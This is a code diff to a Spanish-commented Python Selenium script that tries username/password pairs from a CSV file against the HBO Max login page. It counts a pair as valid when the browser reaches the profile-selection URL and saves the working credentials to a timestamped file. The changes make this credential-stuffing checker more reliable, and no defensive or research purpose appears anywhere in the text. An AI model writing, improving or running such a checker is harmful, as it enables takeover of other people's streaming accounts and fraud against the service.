@@ -10,9 +10,11 @@ from selenium.common.exceptions import NoSuchElementException, WebDriverExceptio
 from tqdm import tqdm
 from datetime import datetime
 
+
 def iniciar_sesion(usuario, contrasena, credenciales_validas):
+    driver = None
+
     try:
-        # Inicializar el navegador Chrome
         driver = webdriver.Chrome()
         driver.maximize_window()
 
@@ -36,25 +38,29 @@ def iniciar_sesion(usuario, contrasena, credenciales_validas):
         )
         submit.click()
 
-        # Esperar un tiempo razonable para que la página se cargue completamente
-        time.sleep(10)
+        WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.TAG_NAME, 'h1'))
+        )
 
-        # Buscar el mensaje de error en el contenido de la página
-        page_content = driver.page_source
-        if "La dirección de e-mail o la contraseña es incorrecta. Vuelve a intentarlo." not in page_content:
+        # Esperar a que la URL cambie a la página de selección de perfil
+        valid_url = 'https://play.hbomax.com/profile/select'
+        # Verificar si hay un mensaje de error
+        if valid_url in driver.current_url:
             print(f"Las credenciales {usuario}:{contrasena} funcionan correctamente")
             credenciales_validas.append((usuario, contrasena))
+        else:
+            print(f"Las credenciales {usuario}:{contrasena} son inválidas")
+
     except NoSuchElementException:
         print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
     except WebDriverException as e:
         print(f"Hubo un problema al intentar iniciar sesión con {usuario}, {contrasena}")
     except Exception as e:
-        # Imprimir el mensaje de error específico si lo hay
-        print(str(e))
+        print(f"Error inesperado: {str(e)}")
     finally:
-        # Cerrar el navegador en cualquier caso
         if driver:
             driver.quit()
+
 
 # Ruta al archivo CSV con las credenciales
 csv_file_path = 'csv/data_hbomax.csv'
@@ -79,7 +85,7 @@ if os.path.isfile(csv_file_path):
 
 # Guardar las credenciales válidas en un archivo .csv
 if credenciales_validas:
-    locale.setlocale(locale.LC_TIME, 'en_ES.UTF-8')
+    locale.setlocale(locale.LC_TIME, 'es_ES.UTF-8')
     now = datetime.now()
     format_date = now.strftime('%d-%b-%Y_%I-%M-%S')  # Formato de fecha en el nombre del archivo
 
